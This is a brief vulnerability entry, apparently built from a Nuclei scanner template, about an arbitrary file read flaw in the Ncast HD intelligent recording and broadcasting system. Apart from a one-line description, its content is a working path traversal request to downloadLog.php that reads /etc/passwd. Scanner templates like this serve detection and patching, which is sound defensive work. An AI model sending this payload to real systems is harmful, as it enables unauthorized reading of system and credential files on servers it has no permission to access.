# Vulnerability: Ncast HD Intelligent Recording - Arbitrary File Reading
**Classification:** NCAST
**Source:** Nuclei Template (`ncast-lfi.yaml`)

## Description
Ncast HD intelligent recording and broadcasting system has an arbitrary file reading vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd
```

